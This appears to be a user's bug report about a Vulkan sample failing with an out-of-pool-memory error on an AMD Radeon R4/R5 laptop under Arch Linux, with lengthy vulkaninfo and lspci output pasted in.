	maxDescriptorSetUpdateAfterBindSampledImages         = 4294967295
	maxDescriptorSetUpdateAfterBindStorageImages         = 4294967295
	maxDescriptorSetUpdateAfterBindInputAttachments      = 4294967295

VkPhysicalDeviceDriverPropertiesKHR:
------------------------------------
	driverID           = DRIVER_ID_AMD_OPEN_SOURCE_KHR
	driverName         = AMD open-source driver
	driverInfo         = 
	conformanceVersion = 1.1.2.3

VkPhysicalDeviceExternalMemoryHostPropertiesEXT:
------------------------------------------------
	minImportedHostPointerAlignment = 0x00001000

VkPhysicalDeviceIDProperties:
-----------------------------
	deviceUUID      =  0000-10-00-00-000000
	driverUUID      = 414d442d-4c49-4e55-582d-445256000
	deviceNodeMask  = 1
	deviceLUIDValid = false

VkPhysicalDeviceInlineUniformBlockPropertiesEXT:
------------------------------------------------
	maxInlineUniformBlockSize                               = 65536
	maxPerStageDescriptorInlineUniformBlocks                = 16
	maxPerStageDescriptorUpdateAfterBindInlineUniformBlocks = 16
	maxDescriptorSetInlineUniformBlocks                     = 16
	maxDescriptorSetUpdateAfterBindInlineUniformBlocks      = 16

VkPhysicalDeviceLineRasterizationPropertiesEXT:
-----------------------------------------------
	lineSubPixelPrecisionBits = 4

VkPhysicalDeviceMaintenance3Properties:
---------------------------------------
	maxPerSetDescriptors    = 4294967295
	maxMemoryAllocationSize = 0x80000000

VkPhysicalDeviceMultiviewProperties:
------------------------------------
	maxMultiviewViewCount     = 6
	maxMultiviewInstanceIndex = 4294967295

VkPhysicalDevicePCIBusInfoPropertiesEXT:
----------------------------------------
	pciDomain   = 0
	pciBus      = 0
	pciDevice   = 1
	pciFunction = 0

VkPhysicalDevicePointClippingProperties:
----------------------------------------
	pointClippingBehavior = POINT_CLIPPING_BEHAVIOR_ALL_CLIP_PLANES

VkPhysicalDeviceProtectedMemoryProperties:
------------------------------------------
	protectedNoFault = false

VkPhysicalDeviceSampleLocationsPropertiesEXT:
---------------------------------------------
	sampleLocationSampleCounts:
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxSampleLocationGridSize:
		width  = 2
		height = 2
	sampleLocationCoordinateRange: count = 2
		0
		1
	sampleLocationSubPixelBits       = 4
	variableSampleLocations          = true

VkPhysicalDeviceSamplerFilterMinmaxPropertiesEXT:
-------------------------------------------------
	filterMinmaxSingleComponentFormats = true
	filterMinmaxImageComponentMapping  = false

VkPhysicalDeviceSubgroupProperties:
-----------------------------------
	subgroupSize              = 64
	supportedStages:
		SHADER_STAGE_VERTEX_BIT
		SHADER_STAGE_TESSELLATION_CONTROL_BIT
		SHADER_STAGE_TESSELLATION_EVALUATION_BIT
		SHADER_STAGE_GEOMETRY_BIT
		SHADER_STAGE_FRAGMENT_BIT
		SHADER_STAGE_COMPUTE_BIT
		SHADER_STAGE_ALL_GRAPHICS
		SHADER_STAGE_ALL
	supportedOperations:
		SUBGROUP_FEATURE_BASIC_BIT
		SUBGROUP_FEATURE_VOTE_BIT
		SUBGROUP_FEATURE_ARITHMETIC_BIT
		SUBGROUP_FEATURE_BALLOT_BIT
		SUBGROUP_FEATURE_SHUFFLE_BIT
		SUBGROUP_FEATURE_SHUFFLE_RELATIVE_BIT
		SUBGROUP_FEATURE_QUAD_BIT
	quadOperationsInAllStages = true

VkPhysicalDeviceSubgroupSizeControlPropertiesEXT:
-------------------------------------------------
	minSubgroupSize              = 64
	maxSubgroupSize              = 64
	maxComputeWorkgroupSubgroups = 4294967295
	requiredSubgroupSizeStages:
		None

VkPhysicalDeviceTransformFeedbackPropertiesEXT:
-----------------------------------------------
	maxTransformFeedbackStreams                = 4
	maxTransformFeedbackBuffers                = 4
	maxTransformFeedbackBufferSize             = 0xffffffff
	maxTransformFeedbackStreamDataSize         = 512
	maxTransformFeedbackBufferDataSize         = 512
	maxTransformFeedbackBufferDataStride       = 512
	transformFeedbackQueries                   = true
	transformFeedbackStreamsLinesTriangles     = true
	transformFeedbackRasterizationStreamSelect = false
	transformFeedbackDraw                      = true

VkPhysicalDeviceVertexAttributeDivisorPropertiesEXT:
----------------------------------------------------
	maxVertexAttribDivisor = 4294967295


Device Extensions: count = 77
	VK_AMD_buffer_marker                    : extension revision 1
	VK_AMD_draw_indirect_count              : extension revision 2
	VK_AMD_gcn_shader                       : extension revision 1
	VK_AMD_gpa_interface                    : extension revision 1
	VK_AMD_memory_overallocation_behavior   : extension revision 1
	VK_AMD_mixed_attachment_samples         : extension revision 1
	VK_AMD_negative_viewport_height         : extension revision 1
	VK_AMD_shader_ballot                    : extension revision 1
	VK_AMD_shader_core_properties           : extension revision 2
	VK_AMD_shader_core_properties2          : extension revision 1
	VK_AMD_shader_explicit_vertex_parameter : extension revision 1
	VK_AMD_shader_fragment_mask             : extension revision 1
	VK_AMD_shader_image_load_store_lod      : extension revision 1
	VK_AMD_shader_info                      : extension revision 1
	VK_AMD_shader_trinary_minmax            : extension revision 1
	VK_AMD_texture_gather_bias_lod          : extension revision 1
	VK_EXT_calibrated_timestamps            : extension revision 1
	VK_EXT_depth_clip_enable                : extension revision 1
	VK_EXT_depth_range_unrestricted         : extension revision 1
	VK_EXT_descriptor_indexing              : extension revision 2
	VK_EXT_external_memory_host             : extension revision 1
	VK_EXT_global_priority                  : extension revision 2
	VK_EXT_hdr_metadata                     : extension revision 2
	VK_EXT_host_query_reset                 : extension revision 1
	VK_EXT_inline_uniform_block             : extension revision 1
	VK_EXT_line_rasterization               : extension revision 1
	VK_EXT_memory_budget                    : extension revision 1
	VK_EXT_memory_priority                  : extension revision 1
	VK_EXT_pci_bus_info                     : extension revision 2
	VK_EXT_queue_family_foreign             : extension revision 1
	VK_EXT_sample_locations                 : extension revision 1
	VK_EXT_sampler_filter_minmax            : extension revision 2
	VK_EXT_scalar_block_layout              : extension revision 1
	VK_EXT_separate_stencil_usage           : extension revision 1
	VK_EXT_shader_stencil_export            : extension revision 1
	VK_EXT_shader_subgroup_ballot           : extension revision 1
	VK_EXT_shader_subgroup_vote             : extension revision 1
	VK_EXT_shader_viewport_index_layer      : extension revision 1
	VK_EXT_subgroup_size_control            : extension revision 2
	VK_EXT_transform_feedback               : extension revision 1
	VK_EXT_vertex_attribute_divisor         : extension revision 3
	VK_GOOGLE_decorate_string               : extension revision 1
	VK_GOOGLE_hlsl_functionality1           : extension revision 1
	VK_KHR_16bit_storage                    : extension revision 1
	VK_KHR_8bit_storage                     : extension revision 1
	VK_KHR_bind_memory2                     : extension revision 1
	VK_KHR_create_renderpass2               : extension revision 1
	VK_KHR_dedicated_allocation             : extension revision 3
	VK_KHR_depth_stencil_resolve            : extension revision 1
	VK_KHR_descriptor_update_template       : extension revision 1
	VK_KHR_device_group                     : extension revision 4
	VK_KHR_draw_indirect_count              : extension revision 1
	VK_KHR_driver_properties                : extension revision 1
	VK_KHR_external_fence                   : extension revision 1
	VK_KHR_external_fence_fd                : extension revision 1
	VK_KHR_external_memory                  : extension revision 1
	VK_KHR_external_memory_fd               : extension revision 1
	VK_KHR_external_semaphore               : extension revision 1
	VK_KHR_external_semaphore_fd            : extension revision 1
	VK_KHR_get_memory_requirements2         : extension revision 1
	VK_KHR_image_format_list                : extension revision 1
	VK_KHR_imageless_framebuffer            : extension revision 1
	VK_KHR_maintenance1                     : extension revision 2
	VK_KHR_maintenance2                     : extension revision 1
	VK_KHR_maintenance3                     : extension revision 1
	VK_KHR_multiview                        : extension revision 1
	VK_KHR_relaxed_block_layout             : extension revision 1
	VK_KHR_sampler_mirror_clamp_to_edge     : extension revision 3
	VK_KHR_shader_atomic_int64              : extension revision 1
	VK_KHR_shader_draw_parameters           : extension revision 1
	VK_KHR_shader_float16_int8              : extension revision 1
	VK_KHR_storage_buffer_storage_class     : extension revision 1
	VK_KHR_swapchain                        : extension revision 70
	VK_KHR_swapchain_mutable_format         : extension revision 1
	VK_KHR_uniform_buffer_standard_layout   : extension revision 1
	VK_KHR_variable_pointers                : extension revision 1
	VK_KHR_vulkan_memory_model              : extension revision 3

VkQueueFamilyProperties[0]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 1
	queueFlags                  = QUEUE_GRAPHICS | QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkQueueFamilyProperties[1]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 4
	queueFlags                  = QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkQueueFamilyProperties[2]:
==========================
	minImageTransferGranularity = (8, 8, 8)
	queueCount                  = 2
	queueFlags                  = QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkPhysicalDeviceMemoryProperties:
=================================
memoryHeaps: count = 2
	memoryHeaps[0]:
		size   = 3221225472 (0xc0000000) (3.00 GiB)
		budget = 3060164096
		usage  = 0
		flags:
			None
	memoryHeaps[1]:
		size   = 1073741824 (0x40000000) (1024.00 MiB)
		budget = 1020054720
		usage  = 0
		flags:
			MEMORY_HEAP_DEVICE_LOCAL_BIT
			MEMORY_HEAP_MULTI_INSTANCE_BIT
memoryTypes: count = 4
	memoryTypes[0]:
		heapIndex     = 1
		propertyFlags = 0x0001:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[1]:
		heapIndex     = 0
		propertyFlags = 0x0006:
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[2]:
		heapIndex     = 1
		propertyFlags = 0x0007:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[3]:
		heapIndex     = 0
		propertyFlags = 0x000e:
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
			MEMORY_PROPERTY_HOST_CACHED_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images

VkPhysicalDeviceFeatures:
=========================
	robustBufferAccess                      = true
	fullDrawIndexUint32                     = true
	imageCubeArray                          = true
	independentBlend                        = true
	geometryShader                          = true
	tessellationShader                      = true
	sampleRateShading                       = true
	dualSrcBlend                            = true
	logicOp                                 = true
	multiDrawIndirect                       = true
	drawIndirectFirstInstance               = true
	depthClamp                              = true
	depthBiasClamp                          = true
	fillModeNonSolid                        = true
	depthBounds                             = true
	wideLines                               = true
	largePoints                             = true
	alphaToOne                              = false
	multiViewport                           = true
	samplerAnisotropy                       = true
	textureCompressionETC2                  = false
	textureCompressionASTC_LDR              = false
	textureCompressionBC                    = true
	occlusionQueryPrecise                   = true
	pipelineStatisticsQuery                 = true
	vertexPipelineStoresAndAtomics          = true
	fragmentStoresAndAtomics                = true
	shaderTessellationAndGeometryPointSize  = true
	shaderImageGatherExtended               = true
	shaderStorageImageExtendedFormats       = true
	shaderStorageImageMultisample           = true
	shaderStorageImageReadWithoutFormat     = true
	shaderStorageImageWriteWithoutFormat    = true
	shaderUniformBufferArrayDynamicIndexing = true
	shaderSampledImageArrayDynamicIndexing  = true
	shaderStorageBufferArrayDynamicIndexing = true
	shaderStorageImageArrayDynamicIndexing  = true
	shaderClipDistance                      = true
	shaderCullDistance                      = true
	shaderFloat64                           = true
	shaderInt64                             = true
	shaderInt16                             = false
	shaderResourceResidency                 = true
	shaderResourceMinLod                    = true
	sparseBinding                           = true
	sparseResidencyBuffer                   = true
	sparseResidencyImage2D                  = true
	sparseResidencyImage3D                  = true
	sparseResidency2Samples                 = false
	sparseResidency4Samples                 = false
	sparseResidency8Samples                 = false
	sparseResidency16Samples                = false
	sparseResidencyAliased                  = true
	variableMultisampleRate                 = true
	inheritedQueries                        = true

VkPhysicalDevice16BitStorageFeatures:
-------------------------------------
	storageBuffer16BitAccess           = true
	uniformAndStorageBuffer16BitAccess = true
	storagePushConstant16              = false
	storageInputOutput16               = false

VkPhysicalDevice8BitStorageFeaturesKHR:
---------------------------------------
	storageBuffer8BitAccess           = true
	uniformAndStorageBuffer8BitAccess = true
	storagePushConstant8              = false

VkPhysicalDeviceDepthClipEnableFeaturesEXT:
-------------------------------------------
	depthClipEnable = true

VkPhysicalDeviceDescriptorIndexingFeaturesEXT:
----------------------------------------------
	shaderInputAttachmentArrayDynamicIndexing          = false
	shaderUniformTexelBufferArrayDynamicIndexing       = true
	shaderStorageTexelBufferArrayDynamicIndexing       = true
	shaderUniformBufferArrayNonUniformIndexing         = true
	shaderSampledImageArrayNonUniformIndexing          = true
	shaderStorageBufferArrayNonUniformIndexing         = true
	shaderStorageImageArrayNonUniformIndexing          = true
	shaderInputAttachmentArrayNonUniformIndexing       = false
	shaderUniformTexelBufferArrayNonUniformIndexing    = true
	shaderStorageTexelBufferArrayNonUniformIndexing    = true
	descriptorBindingUniformBufferUpdateAfterBind      = true
	descriptorBindingSampledImageUpdateAfterBind       = true
	descriptorBindingStorageImageUpdateAfterBind       = true
	descriptorBindingStorageBufferUpdateAfterBind      = true
	descriptorBindingUniformTexelBufferUpdateAfterBind = true
	descriptorBindingStorageTexelBufferUpdateAfterBind = true
	descriptorBindingUpdateUnusedWhilePending          = true
	descriptorBindingPartiallyBound                    = true
	descriptorBindingVariableDescriptorCount           = true
	runtimeDescriptorArray                             = true

VkPhysicalDeviceHostQueryResetFeaturesEXT:
------------------------------------------
	hostQueryReset = true

VkPhysicalDeviceImagelessFramebufferFeaturesKHR:
------------------------------------------------
	imagelessFramebuffer = true

VkPhysicalDeviceInlineUniformBlockFeaturesEXT:
----------------------------------------------
	inlineUniformBlock                                 = true
	descriptorBindingInlineUniformBlockUpdateAfterBind = true

VkPhysicalDeviceLineRasterizationFeaturesEXT:
---------------------------------------------
	rectangularLines         = false
	bresenhamLines           = true
	smoothLines              = false
	stippledRectangularLines = false
	stippledBresenhamLines   = true
	stippledSmoothLines      = false

VkPhysicalDeviceMemoryPriorityFeaturesEXT:
------------------------------------------
	memoryPriority = true

VkPhysicalDeviceMultiviewFeatures:
----------------------------------
	multiview                   = true
	multiviewGeometryShader     = false
	multiviewTessellationShader = true

VkPhysicalDeviceProtectedMemoryFeatures:
----------------------------------------
	protectedMemory = false

VkPhysicalDeviceSamplerYcbcrConversionFeatures:
-----------------------------------------------
	samplerYcbcrConversion = false

VkPhysicalDeviceScalarBlockLayoutFeaturesEXT:
---------------------------------------------
	scalarBlockLayout = true

VkPhysicalDeviceShaderAtomicInt64FeaturesKHR:
---------------------------------------------
	shaderBufferInt64Atomics = true
	shaderSharedInt64Atomics = true

VkPhysicalDeviceShaderDrawParametersFeatures:
---------------------------------------------
	shaderDrawParameters = true

VkPhysicalDeviceShaderFloat16Int8FeaturesKHR:
---------------------------------------------
	shaderFloat16 = false
	shaderInt8    = true

VkPhysicalDeviceSubgroupSizeControlFeaturesEXT:
-----------------------------------------------
	subgroupSizeControl  = true
	computeFullSubgroups = false

VkPhysicalDeviceTransformFeedbackFeaturesEXT:
---------------------------------------------
	transformFeedback = true
	geometryStreams   = true

VkPhysicalDeviceUniformBufferStandardLayoutFeaturesKHR:
-------------------------------------------------------
	uniformBufferStandardLayout = true

VkPhysicalDeviceVariablePointersFeatures:
-----------------------------------------
	variablePointersStorageBuffer = true
	variablePointers              = true

VkPhysicalDeviceVertexAttributeDivisorFeaturesEXT:
--------------------------------------------------
	vertexAttributeInstanceRateDivisor     = true
	vertexAttributeInstanceRateZeroDivisor = false

VkPhysicalDeviceVulkanMemoryModelFeaturesKHR:
---------------------------------------------
	vulkanMemoryModel                             = true
	vulkanMemoryModelDeviceScope                  = true
	vulkanMemoryModelAvailabilityVisibilityChains = false
```
And here is my hardware info:

```
00:01.0 VGA compatible controller: Advanced Micro Devices, Inc. [AMD/ATI] Mullins [Radeon R4/R5 Graphics] (rev 40) (prog-if 00 [VGA controller])
	Subsystem: Toshiba America Info Systems Mullins [Radeon R4/R5 Graphics]
	Flags: bus master, fast devsel, latency 0, IRQ 31
	Memory at e0000000 (64-bit, prefetchable) [size=256M]
	Memory at f0000000 (64-bit, prefetchable) [size=8M]
	I/O ports at 4000 [size=256]
	Memory at f0d00000 (32-bit, non-prefetchable) [size=256K]
	Expansion ROM at 000c0000 [disabled] [size=128K]
	Capabilities: [48] Vendor Specific Information: Len=08 <?>
	Capabilities: [50] Power Management version 3
	Capabilities: [58] Express Root Complex Integrated Endpoint, MSI 00
	Capabilities: [a0] MSI: Enable+ Count=1/1 Maskable- 64bit+
	Capabilities: [100] Vendor Specific Information: ID=0001 Rev=1 Len=010 <?>
	Capabilities: [270] Secondary PCI Express <?>
	Capabilities: [2b0] Address Translation Service (ATS)
	Capabilities: [2c0] Page Request Interface (PRI)
	Capabilities: [2d0] Process Address Space ID (PASID)
	Kernel driver in use: amdgpu
	Kernel modules: radeon, amdgpu
```

My OS is Arch Linux with kernel `linux-5.3.8-arch1-1`. I get this problem using both `RADV` (part of Mesa project) and `amdvlk` (AMDVLK Open, maintained by AMD). Just for reference, I can run [Sascha Willems' Vulkan examples](https://github.com/SaschaWillems/Vulkan) without any issue.

Thanks in advance!

 I've just tried to run the "simple" sample on my laptop and I'm getting this error:

```
terminate called after throwing an instance of 'vk::OutOfPoolMemoryError'
  what():  vk::Device::allocateDescriptorSets: ErrorOutOfPoolMemory
```

Here's the output for `vulkaninfo`:

```
==========
VULKANINFO
==========

Vulkan Instance Version: 1.1.126


Instance Extensions: count = 18
====================
	VK_EXT_acquire_xlib_display            : extension revision 1
	VK_EXT_debug_report                    : extension revision 9
	VK_EXT_debug_utils                     : extension revision 1
	VK_EXT_direct_mode_display             : extension revision 1
	VK_EXT_display_surface_counter         : extension revision 1
	VK_KHR_device_group_creation           : extension revision 1
	VK_KHR_display                         : extension revision 23
	VK_KHR_external_fence_capabilities     : extension revision 1
	VK_KHR_external_memory_capabilities    : extension revision 1
	VK_KHR_external_semaphore_capabilities : extension revision 1
	VK_KHR_get_display_properties2         : extension revision 1
	VK_KHR_get_physical_device_properties2 : extension revision 2
	VK_KHR_get_surface_capabilities2       : extension revision 1
	VK_KHR_surface                         : extension revision 25
	VK_KHR_surface_protected_capabilities  : extension revision 1
	VK_KHR_wayland_surface                 : extension revision 6
	VK_KHR_xcb_surface                     : extension revision 6
	VK_KHR_xlib_surface                    : extension revision 6

Layers: count = 3
=======
VK_LAYER_LUNARG_standard_validation (LunarG Standard Validation Layer) Vulkan version 1.0.126, layer version 1:
	Layer Extensions: count = 0
	Devices: count = 2
		GPU id 	: 0 (AMD RADV KABINI (LLVM 9.0.0))
		Layer-Device Extensions: count = 0

		GPU id 	: 1 (Unknown AMD GPU)
		Layer-Device Extensions: count = 0

VK_LAYER_VALVE_steam_overlay_32 (Steam Overlay Layer) Vulkan version 1.0.3, layer version 1:
	Layer Extensions: count = 0
	Devices: count = 2
		GPU id 	: 0 (AMD RADV KABINI (LLVM 9.0.0))
		Layer-Device Extensions: count = 0

		GPU id 	: 1 (Unknown AMD GPU)
		Layer-Device Extensions: count = 0

VK_LAYER_VALVE_steam_overlay_64 (Steam Overlay Layer) Vulkan version 1.0.3, layer version 1:
	Layer Extensions: count = 0
	Devices: count = 2
		GPU id 	: 0 (AMD RADV KABINI (LLVM 9.0.0))
		Layer-Device Extensions: count = 0

		GPU id 	: 1 (Unknown AMD GPU)
		Layer-Device Extensions: count = 0

Presentable Surfaces:
=====================
GPU id : 0 (AMD RADV KABINI (LLVM 9.0.0)):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 3
		maxImageCount       = 0
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
			COMPOSITE_ALPHA_INHERIT_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false


GPU id : 1 (Unknown AMD GPU):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 3
		maxImageCount       = 0
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
			COMPOSITE_ALPHA_INHERIT_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false


GPU id : 0 (AMD RADV KABINI (LLVM 9.0.0)):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 2
		maxImageCount       = 16
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
			IMAGE_USAGE_INPUT_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false


GPU id : 1 (Unknown AMD GPU):
	Surface types: count = 2
		VK_KHR_xcb_surface
		VK_KHR_xlib_surface
	Formats: count = 2
		SurfaceFormat[0]:
			format = FORMAT_B8G8R8A8_UNORM
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
		SurfaceFormat[1]:
			format = FORMAT_B8G8R8A8_SRGB
			colorSpace = COLOR_SPACE_SRGB_NONLINEAR_KHR
	Present Modes: count = 3
		PRESENT_MODE_IMMEDIATE_KHR
		PRESENT_MODE_MAILBOX_KHR
		PRESENT_MODE_FIFO_KHR
	VkSurfaceCapabilitiesKHR:
	-------------------------
		minImageCount       = 2
		maxImageCount       = 16
		currentExtent:
			width  = 256
			height = 256
		minImageExtent:
			width  = 256
			height = 256
		maxImageExtent:
			width  = 256
			height = 256
		maxImageArrayLayers = 1
		supportedTransforms:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		currentTransform:
			SURFACE_TRANSFORM_IDENTITY_BIT_KHR
		supportedCompositeAlpha:
			COMPOSITE_ALPHA_OPAQUE_BIT_KHR
		supportedUsageFlags:
			IMAGE_USAGE_TRANSFER_SRC_BIT
			IMAGE_USAGE_TRANSFER_DST_BIT
			IMAGE_USAGE_SAMPLED_BIT
			IMAGE_USAGE_STORAGE_BIT
			IMAGE_USAGE_COLOR_ATTACHMENT_BIT
			IMAGE_USAGE_INPUT_ATTACHMENT_BIT
	VkSurfaceCapabilities2EXT:
	--------------------------
		supportedSurfaceCounters:
			None
	VkSurfaceProtectedCapabilitiesKHR:
	----------------------------------
		supportsProtected = false



Groups:
=======
	Device Group Properties (Group 0):
		physicalDeviceCount: count = 1
			AMD RADV KABINI (LLVM 9.0.0) (ID: 0)
		subsetAllocation = 0

	Device Group Present Capabilities (Group 0):
		AMD RADV KABINI (LLVM 9.0.0) (ID: 0)
		Can present images from the following devices:
			AMD RADV KABINI (LLVM 9.0.0) (ID: 0)
		Present modes:
			DEVICE_GROUP_PRESENT_MODE_LOCAL_BIT_KHR

	Device Group Properties (Group 1):
		physicalDeviceCount: count = 1
			Unknown AMD GPU (ID: 0)
		subsetAllocation = 0

	Device Group Present Capabilities (Group 1):
		Unknown AMD GPU (ID: 0)
		Can present images from the following devices:
			Unknown AMD GPU (ID: 0)
		Present modes:
			DEVICE_GROUP_PRESENT_MODE_LOCAL_BIT_KHR


Device Properties and Extensions:
=================================
GPU0:
VkPhysicalDeviceProperties:
---------------------------
	apiVersion     = 4198507 (1.1.107)
	driverVersion  = 79699971 (0x4c02003)
	vendorID       = 0x1002
	deviceID       = 0x9851
	deviceType     = PHYSICAL_DEVICE_TYPE_INTEGRATED_GPU
	deviceName     = AMD RADV KABINI (LLVM 9.0.0)

VkPhysicalDeviceLimits:
-----------------------
	maxImageDimension1D                             = 16384
	maxImageDimension2D                             = 16384
	maxImageDimension3D                             = 2048
	maxImageDimensionCube                           = 16384
	maxImageArrayLayers                             = 2048
	maxTexelBufferElements                          = 134217728
	maxUniformBufferRange                           = 4294967295
	maxStorageBufferRange                           = 4294967295
	maxPushConstantsSize                            = 128
	maxMemoryAllocationCount                        = 4294967295
	maxSamplerAllocationCount                       = 65536
	bufferImageGranularity                          = 0x00000040
	sparseAddressSpaceSize                          = 0xffffffff
	maxBoundDescriptorSets                          = 32
	maxPerStageDescriptorSamplers                   = 9586978
	maxPerStageDescriptorUniformBuffers             = 9586978
	maxPerStageDescriptorStorageBuffers             = 9586978
	maxPerStageDescriptorSampledImages              = 9586978
	maxPerStageDescriptorStorageImages              = 9586978
	maxPerStageDescriptorInputAttachments           = 9586978
	maxPerStageResources                            = 9586978
	maxDescriptorSetSamplers                        = 9586978
	maxDescriptorSetUniformBuffers                  = 9586978
	maxDescriptorSetUniformBuffersDynamic           = 16
	maxDescriptorSetStorageBuffers                  = 9586978
	maxDescriptorSetStorageBuffersDynamic           = 8
	maxDescriptorSetSampledImages                   = 9586978
	maxDescriptorSetStorageImages                   = 9586978
	maxDescriptorSetInputAttachments                = 9586978
	maxVertexInputAttributes                        = 32
	maxVertexInputBindings                          = 32
	maxVertexInputAttributeOffset                   = 2047
	maxVertexInputBindingStride                     = 2048
	maxVertexOutputComponents                       = 128
	maxTessellationGenerationLevel                  = 64
	maxTessellationPatchSize                        = 32
